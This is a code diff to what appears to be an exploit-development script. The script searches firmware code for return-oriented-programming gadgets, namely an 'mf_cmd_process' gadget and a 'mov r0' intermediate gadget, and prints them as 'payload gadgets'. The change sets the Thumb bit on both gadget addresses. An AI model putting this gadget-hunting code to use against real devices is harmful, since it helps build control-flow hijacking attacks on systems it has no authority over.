@@ -200,7 +200,7 @@ def walk_app_code(appcode: bytes):
                     try:
                         decoded = appcode[loaded_offset:first_nullbyte].decode('utf-8')
                         if 'mf_test.c' in decoded:
-                            mf_cmd_gadget_addr = ldr_inst.address
+                            mf_cmd_gadget_addr = ldr_inst.address + 1
                             break
                     except UnicodeError:
                         pass
@@ -208,7 +208,7 @@ def walk_app_code(appcode: bytes):
     if mf_cmd_gadget_addr is None:
         raise RuntimeError("Failed to find the mf_cmd_process gadget address")
 
-    print(f"[+] mf_cmd_process gadget address: {mf_cmd_gadget_addr:#x}")
+    print(f"[+] mf_cmd_process gadget address (THUMB): {mf_cmd_gadget_addr:#x}")
 
     print(f"[!] Searching for a mov r0, {json_obj_reg_name} intermediate gadget")
     
@@ -228,9 +228,9 @@ def walk_app_code(appcode: bytes):
     for mi in intermediate_gadget.matched_instructions:
         print(f"\t{mi.address:#x}: {mi.mnemonic} {mi.op_str}")
 
-    intermediate_gadget_addr = intermediate_gadget.start_address
+    intermediate_gadget_addr = intermediate_gadget.start_address + 1
 
-    print(f"[+] Payload gadgets: {intermediate_gadget_addr=:#x} {mf_cmd_gadget_addr=:#x}")
+    print(f"[+] Payload gadgets (THUMB): {intermediate_gadget_addr=:#x} {mf_cmd_gadget_addr=:#x}")
 
 if __name__ == '__main__':
     if not sys.argv[1:]:
